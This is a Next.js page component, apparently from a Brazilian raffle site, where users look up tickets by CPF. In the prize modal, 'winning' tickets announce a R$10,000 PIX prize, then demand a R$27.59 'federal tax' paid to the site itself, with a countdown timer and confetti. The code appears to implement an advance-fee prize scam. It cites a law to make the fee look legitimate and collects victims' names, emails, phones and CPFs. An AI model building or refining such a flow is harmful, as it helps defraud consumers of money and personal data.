'use client';

import { useState, useEffect, useCallback, useRef } from 'react';
import Image from 'next/image';
import Header from '@/components/Header';
import Footer from '@/components/Footer';
import { fireConfettiBurst, loadConfettiScript } from '@/utils/confetti';

// --- Interfaces ---
interface Bilhete {
  numero: string;
  premiada?: boolean;
}

interface Compra {
  id: string;
  created_at: string;
  quantidade_bilhetes: number;
  valor_total: number;
  status: string;
  bilhetes: Bilhete[];
}

interface TaxPixData {
  token: string;
  qrCodeUrl: string;
  pixCopiaECola: string;
  valor: number;
}

interface ClienteData {
  nome: string;
  email: string;
  telefone: string;
  cpf: string;
}

const PREMIO_VALOR = 'R$ 10.000,00';
const PREMIO_DESCRICAO = 'PIX de R$ 10.000,00';
const TAX_VALOR = 27.59;

const MeusTitulosPage = () => {
  const [cpf, setCpf] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [compras, setCompras] = useState<Compra[]>([]);
  const [searched, setSearched] = useState(false);
  const [clienteData, setClienteData] = useState<ClienteData | null>(null);

  // Modal de prêmio
  const [showPrizeModal, setShowPrizeModal] = useState(false);
  const [selectedBilhete, setSelectedBilhete] = useState<Bilhete | null>(null);

  // Modal de checkout do imposto
  const [taxStep, setTaxStep] = useState<'info' | 'pix' | 'processing'>('info');
  const [taxPixData, setTaxPixData] = useState<TaxPixData | null>(null);
  const [taxLoading, setTaxLoading] = useState(false);
  const [taxError, setTaxError] = useState<string | null>(null);
  const [isCopied, setIsCopied] = useState(false);
  const [showQr, setShowQr] = useState(false);
  const [timeLeft, setTimeLeft] = useState(600);
  const [taxPaymentStatus, setTaxPaymentStatus] = useState<'pending' | 'paid'>('pending');
  const [isVerifying, setIsVerifying] = useState(false);

  const checkStatusRef = useRef<((silent: boolean) => Promise<void>) | null>(null);

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    const maskedValue = value
      .replace(/\D/g, '')
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
    setCpf(maskedValue);
  };

  const handleSearch = async (e: React.FormEvent) => {
    e.preventDefault();
    if (cpf.length < 14) return;

    setIsLoading(true);
    setError(null);
    setCompras([]);
    setSearched(true);

    try {
      const res = await fetch('/api/titulos/lookup', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cpf: cpf.replace(/\D/g, '') }),
      });

      const data = await res.json();

      if (!res.ok || !data.success) {
        throw new Error(data.message || 'Erro ao buscar suas compras.');
      }

      const comprasFormatadas = (data.compras || []).map((c: Compra) => ({
        ...c,
        bilhetes: c.bilhetes || []
      }));

      setCompras(comprasFormatadas);

      // Salvar dados do cliente para uso no checkout do imposto
      if (data.cliente) {
        setClienteData(data.cliente);
      }

    } catch (err) {
      if (err instanceof Error) {
        setError(err.message);
      } else {
        setError('Ocorreu um erro ao buscar. Tente novamente.');
      }
    } finally {
      setIsLoading(false);
    }
  };

  // --- Prêmio / Imposto ---
  // Carregar script de confetti ao montar
  useEffect(() => {
    loadConfettiScript();
  }, []);

  const handleBilheteClick = (bilhete: Bilhete) => {
    if (!bilhete.premiada) return;
    setSelectedBilhete(bilhete);
    setShowPrizeModal(true);
    setTaxStep('info');
    setTaxPixData(null);
    setTaxError(null);
    setTimeLeft(600);
    setTaxPaymentStatus('pending');
    setIsCopied(false);
    setShowQr(false);
    setIsVerifying(false);
    // Confetti!
    setTimeout(() => fireConfettiBurst(), 400);
  };

  const handleGenerateTaxPix = async () => {
    if (!clienteData) {
      setTaxError('Dados do cliente não encontrados.');
      return;
    }
    setTaxLoading(true);
    setTaxError(null);
    try {
      const res = await fetch('/api/payment', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          nome: clienteData.nome,
          email: clienteData.email,
          cpf: clienteData.cpf,
          telefone: clienteData.telefone,
          quantity: 1,
          amount: TAX_VALOR,
          spins: 0,
          campaignTitle: 'Imposto Federal - Liberação de Prêmio',
        }),
      });
      const data = await res.json();
      if (!res.ok || !data.success) {
        throw new Error(data.message || 'Erro ao gerar pagamento.');
      }
      setTaxPixData(data);
      setTaxStep('pix');
      setShowQr(window.innerWidth >= 768);
      setTimeLeft(600);

      // Simulação de pagamento em modo debug
      if (process.env.NEXT_PUBLIC_DEBUG_CHECKOUT === 'true') {
        console.log('Modo DEBUG ativado: Simulando pagamento do imposto em 5s...');
        setTimeout(() => {
          setTaxPaymentStatus('paid');
          setTaxStep('processing');
          fireConfettiBurst();
        }, 5000);
      }
    } catch (err) {
      if (err instanceof Error) setTaxError(err.message);
      else setTaxError('Erro ao gerar pagamento do imposto.');
    } finally {
      setTaxLoading(false);
    }
  };

  const copyToClipboard = useCallback((text: string) => {
    navigator.clipboard.writeText(text);
    setIsCopied(true);
    setTimeout(() => setIsCopied(false), 2000);
  }, []);

  // Verificar status do pagamento do imposto
  const handleCheckTaxStatus = useCallback(async (silent = false) => {
    if (!taxPixData?.token) return;
    if (!silent) {
      setIsVerifying(true);
      setTaxError(null);
    }
    try {
      const res = await fetch('/api/payment/status', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: taxPixData.token }),
        cache: 'no-store'
      });
      const data = await res.json();
      if (data.status === 'paid') {
        setTaxPaymentStatus('paid');
        setTaxStep('processing');
        setTaxError(null);
      } else if (!silent) {
        setTaxError('O pagamento ainda está pendente. Tente novamente em alguns instantes.');
      }
    } catch {
      if (!silent) setTaxError('Erro ao verificar o pagamento.');
    } finally {
      if (!silent) setIsVerifying(false);
    }
  }, [taxPixData?.token]);

  useEffect(() => {
    checkStatusRef.current = handleCheckTaxStatus;
  });

  // Timer
  useEffect(() => {
    if (taxPixData && timeLeft > 0 && taxPaymentStatus !== 'paid') {
      const timer = setInterval(() => setTimeLeft(t => t - 1), 1000);
      return () => clearInterval(timer);
    }
  }, [taxPixData, timeLeft, taxPaymentStatus]);

  // Polling automático
  useEffect(() => {
    if (taxPixData && taxPaymentStatus === 'pending' && timeLeft > 0) {
      const interval = setInterval(() => {
        checkStatusRef.current?.(true);
      }, 3000);
      return () => clearInterval(interval);
    }
  }, [taxPixData, taxPaymentStatus, timeLeft]);

  // SSE
  useEffect(() => {
    if (!taxPixData?.token || taxPaymentStatus === 'paid') return;
    const es = new EventSource(`/api/payment/stream?id=${encodeURIComponent(taxPixData.token)}`);
    es.addEventListener('paid', () => {
      setTaxPaymentStatus('paid');
      setTaxStep('processing');
      es.close();
    });
    es.addEventListener('timeout', () => es.close());
    es.addEventListener('error', () => es.close());
    return () => es.close();
  }, [taxPixData?.token, taxPaymentStatus]);

  const closePrizeModal = () => {
    setShowPrizeModal(false);
    setSelectedBilhete(null);
  };

  // Bloquear scroll quando modal estiver aberto
  useEffect(() => {
    if (showPrizeModal) {
      document.body.classList.add('modal-open');
    } else {
      document.body.classList.remove('modal-open');
    }
    return () => { document.body.classList.remove('modal-open'); };
  }, [showPrizeModal]);

  const minutes = Math.floor(timeLeft / 60);
  const seconds = timeLeft % 60;

  return (
    <div className="bg-[#f5f5f5] min-h-screen flex flex-col font-sans" style={{ fontFamily: 'Ubuntu, ui-sans-serif, system-ui, sans-serif' }}>
      <Header />

      <main className="flex-grow container mx-auto max-w-lg px-4 py-6 pb-24">

        {/* Cartão de Busca */}
        <div className="bg-white rounded-3xl p-6 shadow-sm border border-gray-100 mb-6">
          <div className="text-center mb-6">
            <div className="w-16 h-16 bg-blue-50 rounded-2xl flex items-center justify-center mx-auto mb-4 text-blue-600 shadow-sm">
              <i className="bi bi-search text-3xl"></i>
            </div>
            <h1 className="text-2xl font-bold text-gray-800 mb-2">Consultar bilhetes</h1>
            <p className="text-gray-500 text-sm leading-relaxed">
              Informe seu CPF abaixo para localizar suas compras e visualizar seus números da sorte.
            </p>
          </div>

          <form onSubmit={handleSearch} className="space-y-4">
            <div>
              <label className="block text-xs font-bold text-gray-700 uppercase mb-1.5 ml-1">CPF do titular</label>
              <div className="relative">
                <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none text-gray-400">
                  <i className="bi bi-person-vcard text-xl"></i>
                </div>
                <input
                  type="tel"
                  inputMode="numeric"
                  value={cpf}
                  onChange={handleCpfChange}
                  placeholder="000.000.000-00"
                  maxLength={14}
                  required
                  className="w-full pl-11 pr-4 py-3.5 bg-gray-50 border border-gray-200 rounded-xl text-gray-900 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all font-medium text-lg shadow-sm"
                />
              </div>
            </div>

            <button
              type="submit"
              disabled={isLoading || cpf.length < 14}
              className="w-full bg-gradient-to-br from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white font-bold py-3.5 rounded-xl shadow-lg hover:shadow-xl transition-all hover:-translate-y-0.5 active:translate-y-0 flex items-center justify-center gap-2 text-lg disabled:opacity-70 disabled:cursor-not-allowed disabled:shadow-none disabled:transform-none"
            >
              {isLoading ? (
                <>
                  <svg className="animate-spin -ml-1 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
                  <span>Buscando...</span>
                </>
              ) : (
                <>
                  <span>Buscar meus títulos</span>
                  <i className="bi bi-arrow-right"></i>
                </>
              )}
            </button>
          </form>

          {error && (
            <div className="mt-4 bg-red-50 border border-red-100 text-red-600 p-3 rounded-xl text-center text-sm flex items-center justify-center gap-2">
              <i className="bi bi-exclamation-circle-fill"></i>
              {error}
            </div>
          )}
        </div>

        {/* Resultados */}
        <div className="space-y-4 animate-in fade-in slide-in-from-bottom-4 duration-500">
          {!isLoading && searched && compras.length === 0 && !error && (
            <div className="bg-white rounded-3xl p-8 shadow-sm border border-gray-100 text-center">
              <div className="w-16 h-16 bg-yellow-50 rounded-full flex items-center justify-center mx-auto mb-4 text-yellow-500">
                <i className="bi bi-emoji-frown text-3xl"></i>
              </div>
              <h3 className="text-lg font-bold text-gray-800 mb-2">Nenhuma compra encontrada</h3>
              <p className="text-gray-500 text-sm">Verifique se o CPF digitado está correto ou se a compra já foi confirmada.</p>
            </div>
          )}



          {compras.map((compra) => (
            <div key={compra.id} className="bg-white rounded-2xl p-5 shadow-md border border-gray-100 relative overflow-hidden group hover:shadow-lg transition-shadow">

              {/* Header do Card */}
              <div className="flex justify-between items-start mb-4">
                <div>
                  <span className="text-[10px] font-bold text-gray-400 uppercase tracking-wider mb-1 block">
                    Realizada em {new Date(compra.created_at).toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: '2-digit', hour: '2-digit', minute: '2-digit' })}
                  </span>
                  <h3 className="text-xl font-bold text-gray-800 flex items-center gap-2">
                    {compra.quantidade_bilhetes} {compra.quantidade_bilhetes === 1 ? 'Cota' : 'Cotas'}
                  </h3>
                </div>
                <div className={`px-3 py-1 rounded-full text-xs font-bold uppercase tracking-wide shadow-sm flex items-center gap-1.5 ${compra.status === 'paid' ? 'bg-green-100 text-green-700' :
                  compra.status === 'pending' ? 'bg-yellow-100 text-yellow-700' : 'bg-red-100 text-red-700'
                  }`}>
                  <i className={`bi ${compra.status === 'paid' ? 'bi-check-circle-fill' :
                    compra.status === 'pending' ? 'bi-clock-fill' : 'bi-x-circle-fill'
                    }`}></i>
                  {compra.status === 'paid' ? 'Confirmado' :
                    compra.status === 'pending' ? 'Pendente' : 'Cancelado'}
                </div>
              </div>

              {/* Valor */}
              <div className="mb-4 bg-gray-50 rounded-xl p-3 flex justify-between items-center border border-gray-100">
                <span className="text-sm font-semibold text-gray-600">Valor total</span>
                <span className="text-lg font-bold text-gray-900">{compra.valor_total.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}</span>
              </div>

              {/* Títulos */}
              <div className="bg-blue-50/50 rounded-xl p-4 border border-blue-100/50">
                <p className="text-xs font-bold text-blue-800 uppercase mb-3 flex items-center gap-1.5">
                  <i className="bi bi-ticket-perforated-fill"></i>
                  Seus números da sorte
                </p>

                {compra.status === 'paid' && compra.bilhetes.length > 0 ? (
                  <div className="flex flex-wrap gap-1.5">
                    {compra.bilhetes.map((bilhete) => (
                      bilhete.premiada ? (
                        <button
                          key={bilhete.numero}
                          onClick={() => handleBilheteClick(bilhete)}
                          className="relative bg-gradient-to-br from-yellow-300 via-yellow-400 to-amber-500 text-amber-900 font-mono font-bold text-sm px-2.5 py-1.5 rounded-lg shadow-md flex-grow-0 border-2 border-yellow-500 cursor-pointer hover:scale-105 transition-transform active:scale-95"
                          style={{
                            animation: 'premiadaPulse 2s ease-in-out infinite',
                            boxShadow: '0 0 12px rgba(245, 158, 11, 0.5)',
                          }}
                        >
                          <span className="relative z-10 flex items-center gap-1">
                            <i className="bi bi-trophy-fill text-amber-700 text-xs"></i>
                            {bilhete.numero}
                          </span>
                        </button>
                      ) : (
                        <span key={bilhete.numero} className="bg-white border border-blue-100 text-blue-900 font-mono font-bold text-sm px-2.5 py-1.5 rounded-lg shadow-sm flex-grow-0">
                          {bilhete.numero}
                        </span>
                      )
                    ))}
                  </div>
                ) : (
                  <div className="text-center py-4 bg-white/50 rounded-lg border border-dashed border-blue-200">
                    <p className="text-sm text-gray-500 font-medium">
                      {compra.status === 'pending'
                        ? 'Aguardando confirmação do pagamento...'
                        : 'Nenhum título disponível.'}
                    </p>
                  </div>
                )}

                {/* Banner de cota premiada - dentro da área de Meus Títulos */}
                {compra.status === 'paid' && compra.bilhetes.some(b => b.premiada) && (() => {
                  const bilhetePremiado = compra.bilhetes.find(b => b.premiada);
                  if (!bilhetePremiado) return null;
                  return (
                    <div className="mt-3 bg-gradient-to-r from-amber-50 to-yellow-50 border-2 border-amber-300 rounded-xl p-3 shadow-sm" style={{ animation: 'premiadaPulse 3s ease-in-out infinite' }}>
                      <div className="flex items-center gap-3">
                        <div className="w-10 h-10 bg-gradient-to-br from-yellow-400 to-amber-500 rounded-full flex items-center justify-center shrink-0 shadow-md">
                          <i className="bi bi-trophy-fill text-white text-lg"></i>
                        </div>
                        <div className="flex-1 min-w-0">
                          <p className="text-sm font-bold text-amber-900">🎉 Você tem uma cota premiada!</p>
                          <p className="text-xs text-amber-700 mt-0.5">Cota <span className="font-mono font-bold">{bilhetePremiado.numero}</span> — Prêmio de <b>{PREMIO_VALOR}</b></p>
                        </div>
                      </div>
                      <button
                        onClick={() => handleBilheteClick(bilhetePremiado)}
                        className="mt-2.5 w-full bg-gradient-to-r from-amber-500 to-yellow-500 hover:from-amber-600 hover:to-yellow-600 text-white font-bold py-2.5 rounded-lg text-sm shadow-md hover:shadow-lg transition-all flex items-center justify-center gap-2 active:scale-[0.98]"
                      >
                        <i className="bi bi-gift-fill"></i>
                        Resgatar prêmio
                        <i className="bi bi-arrow-right"></i>
                      </button>
                    </div>
                  );
                })()}

              </div>
            </div>
          ))}
        </div>

      </main>
      <Footer />

      {/* ======================== MODAL DE PRÊMIO / IMPOSTO ======================== */}
      {showPrizeModal && selectedBilhete && (
        <div className="fixed inset-0 bg-black/80 z-[999999] flex justify-center items-center p-4 overflow-y-auto h-screen w-screen">
          <div className="bg-gray-50 rounded-lg shadow-xl w-full max-w-lg mx-auto" onClick={(e) => e.stopPropagation()}>

            {/* Header do Modal */}
            <div className="relative text-center p-3 border-b border-gray-200">
              <h5 className="font-semibold text-gray-800">
                {taxStep === 'processing' ? 'Prêmio em processamento' : taxStep === 'pix' ? 'Pagamento do Imposto' : '🎉 Cota Premiada!'}
              </h5>
              <button onClick={closePrizeModal} className="absolute top-1/2 right-3 -translate-y-1/2 text-gray-400 hover:text-gray-600">
                <i className="bi bi-x text-2xl"></i>
              </button>
            </div>

            <div className="p-4 space-y-3">

              {/* === STEP INFO: Informações do prêmio === */}
              {taxStep === 'info' && (
                <>
                  {/* Banner do prêmio */}
                  <div className="bg-gradient-to-br from-yellow-400 via-amber-400 to-yellow-500 rounded-xl p-5 text-center shadow-lg relative overflow-hidden">
                    <div className="absolute inset-0 opacity-10" style={{ backgroundImage: 'url("data:image/svg+xml,%3Csvg width=\'60\' height=\'60\' viewBox=\'0 0 60 60\' xmlns=\'http://www.w3.org/2000/svg\'%3E%3Cg fill=\'none\' fill-rule=\'evenodd\'%3E%3Cg fill=\'%23ffffff\' fill-opacity=\'0.4\'%3E%3Cpath d=\'M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z\'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E")' }} />
                    <div className="relative">
                      <div className="w-16 h-16 bg-white/30 rounded-full flex items-center justify-center mx-auto mb-3 backdrop-blur-sm">
                        <i className="bi bi-trophy-fill text-3xl text-amber-800"></i>
                      </div>
                      <h2 className="text-2xl font-extrabold text-amber-900 mb-1">Parabéns!</h2>
                      <p className="text-amber-800 font-semibold text-sm mb-2">Sua cota <span className="font-mono bg-white/40 px-2 py-0.5 rounded">{selectedBilhete.numero}</span> foi premiada!</p>
                      <div className="bg-white/30 backdrop-blur-sm rounded-lg p-3 mt-3">
                        <p className="text-xs text-amber-800 font-medium uppercase tracking-wide mb-1">Você ganhou</p>
                        <p className="text-3xl font-black text-amber-900">{PREMIO_VALOR}</p>
                        <p className="text-xs text-amber-800 font-semibold mt-0.5">no PIX</p>
                      </div>
                    </div>
                  </div>

                  {/* Informações sobre o imposto */}
                  <div className="bg-white rounded-xl p-4 border border-gray-200 shadow-sm space-y-3">
                    <div className="flex items-start gap-3">
                      <div className="w-8 h-8 bg-blue-50 rounded-full flex items-center justify-center shrink-0 mt-0.5">
                        <i className="bi bi-info-circle-fill text-blue-600"></i>
                      </div>
                      <div>
                        <h4 className="font-bold text-gray-800 text-sm">Tributos Federais (Lei 13.756/18)</h4>
                        <p className="text-xs text-gray-500 mt-0.5 leading-relaxed">
                          De acordo com a legislação vigente, para a liberação de prêmios é necessário o recolhimento do imposto federal obrigatório.
                        </p>
                      </div>
                    </div>
                    <div className="bg-gray-50 rounded-lg p-3 flex justify-between items-center border border-gray-100">
                      <span className="text-sm font-semibold text-gray-600">Imposto a pagar</span>
                      <span className="text-xl font-bold text-gray-900">{TAX_VALOR.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}</span>
                    </div>
                    <p className="text-[11px] text-gray-400 text-center">
                      Após o pagamento, seu prêmio de {PREMIO_DESCRICAO} será liberado em até 24h úteis.
                    </p>
                  </div>

                  {taxError && (
                    <div className="bg-red-100 border-l-4 border-red-400 text-red-800 p-2 text-sm rounded-r-md">
                      <i className="bi bi-x-circle-fill mr-2"></i>{taxError}
                    </div>
                  )}

                  <button
                    onClick={handleGenerateTaxPix}
                    disabled={taxLoading}
                    className="w-full bg-[#1db954] hover:bg-[#1aa34a] text-white font-bold py-3 px-4 rounded-lg flex justify-center items-center space-x-2 transition-colors disabled:bg-gray-400 text-sm"
                  >
                    {taxLoading ? (
                      <>
                        <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
                        <span>Gerando pagamento...</span>
                      </>
                    ) : (
                      <>
                        <span>Pagar imposto e liberar prêmio</span>
                        <i className="bi bi-arrow-right"></i>
                      </>
                    )}
                  </button>
                </>
              )}

              {/* === STEP PIX: Pagamento do imposto === */}
              {taxStep === 'pix' && taxPixData && (
                <div className="space-y-2 max-h-[70vh] overflow-y-auto">
                  <div className="text-center p-2">
                    <p className="text-sm text-gray-600">Você tem <b className="text-red-500">{String(minutes).padStart(2, '0')}:{String(seconds).padStart(2, '0')}</b> para pagar</p>
                  </div>

                  <div className="text-center">
                    <button onClick={() => setShowQr(!showQr)} className="text-sm text-gray-600 font-semibold hover:text-black">
                      <i className={`bi ${showQr ? 'bi-eye-slash' : 'bi-qr-code'}`}></i>
                      {showQr ? ' Ocultar QR Code' : ' Exibir QR Code'}
                    </button>
                  </div>
                  {showQr && (
                    <div className="flex justify-center">
                      <Image src={taxPixData.qrCodeUrl} alt="QR Code PIX" width={200} height={200} className="border-4 border-green-400 rounded-lg" />
                    </div>
                  )}

                  <div className="bg-white p-3 rounded-md shadow-sm border border-gray-200 space-y-3 text-sm">
                    <div className="flex items-center space-x-2">
                      <span className="flex items-center justify-center w-5 h-5 bg-gray-200 text-gray-700 rounded-full font-bold text-xs shrink-0">1</span>
                      <p className="font-semibold text-gray-700">Copie o código PIX abaixo.</p>
                    </div>
                    <div className="bg-gray-100 p-2 rounded-md flex items-center justify-between">
                      <span className="text-xs font-mono text-green-700 truncate mr-2">{taxPixData.pixCopiaECola}</span>
                      <button
                        onClick={() => copyToClipboard(taxPixData.pixCopiaECola)}
                        className={`${isCopied ? 'bg-green-100 text-green-700' : 'bg-gray-200 text-gray-700'} px-2 py-1 rounded-md text-xs font-semibold hover:bg-gray-300 transition-all flex items-center space-x-1 shrink-0`}
                      >
                        <i className={`bi ${isCopied ? 'bi-check-all' : 'bi-clipboard-check'}`}></i>
                        <span>{isCopied ? 'Copiado!' : 'Copiar'}</span>
                      </button>
                    </div>
                  </div>

                  <div className="bg-white p-3 rounded-md shadow-sm border border-gray-200 space-y-2 text-xs text-gray-600">
                    <div className="flex items-start space-x-2"><span className="flex items-center justify-center w-5 h-5 bg-gray-200 text-gray-700 rounded-full font-bold text-xs mt-1 shrink-0">2</span><p>Abra o app do seu banco e escolha a opção PIX.</p></div>
                    <div className="flex items-start space-x-2"><span className="flex items-center justify-center w-5 h-5 bg-gray-200 text-gray-700 rounded-full font-bold text-xs mt-1 shrink-0">3</span><p>Selecione PIX cópia e cola, cole a chave e confirme.</p></div>
                  </div>

                  {taxPaymentStatus === 'pending' && timeLeft === 0 && (
                    <div className="bg-red-100 border-l-4 border-red-400 text-red-800 p-2 text-xs rounded-r-md">
                      O tempo para pagamento expirou. Por favor, tente novamente.
                    </div>
                  )}

                  {taxError && (
                    <div className="bg-red-100 border-l-4 border-red-400 text-red-800 p-2 text-sm rounded-r-md mb-2">
                      <i className="bi bi-x-circle-fill mr-2"></i>{taxError}
                    </div>
                  )}

                  {timeLeft > 0 && (
                    <button onClick={() => handleCheckTaxStatus(false)} disabled={isVerifying} className="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-2 rounded-lg flex items-center justify-center space-x-2 text-sm transition-colors disabled:bg-green-800">
                      {isVerifying ? (
                        <>
                          <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
                          <span>Verificando...</span>
                        </>
                      ) : (
                        <>
                          <i className="bi bi-check-circle-fill"></i>
                          <span>Já fiz o pagamento</span>
                        </>
                      )}
                    </button>
                  )}

                  {/* Detalhes */}
                  <div className="bg-white p-3 rounded-md shadow-sm border border-gray-200 space-y-1 text-sm">
                    <h4 className="font-bold text-gray-800 border-b pb-1 mb-2">Detalhes do pagamento</h4>
                    <p className="text-xs text-gray-500 break-words"><b>ID:</b> {taxPixData.token}</p>
                    <p className="text-xs text-gray-700"><b>Descrição:</b> Tributos Federais (Lei 13.756/18)</p>
                    <p className="text-xs text-gray-700"><b>Prêmio:</b> {PREMIO_DESCRICAO}</p>
                    <p className="text-xs text-gray-700"><b>Cota premiada:</b> <span className="font-mono">{selectedBilhete.numero}</span></p>
                    <p className="text-xs font-bold text-gray-800"><b>Total:</b> {taxPixData.valor.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}</p>
                  </div>
                </div>
              )}

              {/* === STEP PROCESSING: Confirmação de processamento === */}
              {taxStep === 'processing' && (
                <div className="text-center space-y-4 py-4">
                  <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto">
                    <i className="bi bi-check-lg text-green-600 text-3xl"></i>
                  </div>
                  <h3 className="text-xl font-bold text-gray-800">Pagamento confirmado!</h3>
                  <p className="text-sm text-gray-600 leading-relaxed">
                    Estamos processando a liberação do seu prêmio de <b className="text-green-700">{PREMIO_DESCRICAO}</b>.
                  </p>
                  <div className="bg-blue-50 border border-blue-100 rounded-xl p-4 text-left space-y-2">
                    <div className="flex items-start gap-2">
                      <i className="bi bi-clock-fill text-blue-600 mt-0.5"></i>
                      <p className="text-xs text-blue-800">O prêmio será enviado via PIX em até <b>24 horas úteis</b>.</p>
                    </div>
                    <div className="flex items-start gap-2">
                      <i className="bi bi-whatsapp text-blue-600 mt-0.5"></i>
                      <p className="text-xs text-blue-800">Você receberá uma notificação no WhatsApp assim que o prêmio for liberado.</p>
                    </div>
                  </div>
                  <button
                    onClick={closePrizeModal}
                    className="w-full bg-gray-900 hover:bg-gray-800 text-white font-bold py-3 rounded-lg text-sm transition-colors"
                  >
                    Entendi, fechar
                  </button>
                </div>
              )}

            </div>
          </div>
        </div>
      )}

      {/* CSS da animação da cota premiada */}
      <style jsx global>{`
        @keyframes premiadaPulse {
          0%, 100% {
            box-shadow: 0 0 8px rgba(245, 158, 11, 0.4);
            transform: scale(1);
          }
          50% {
            box-shadow: 0 0 18px rgba(245, 158, 11, 0.7);
            transform: scale(1.03);
          }
        }
      `}</style>
    </div>
  );
};

export default MeusTitulosPage;
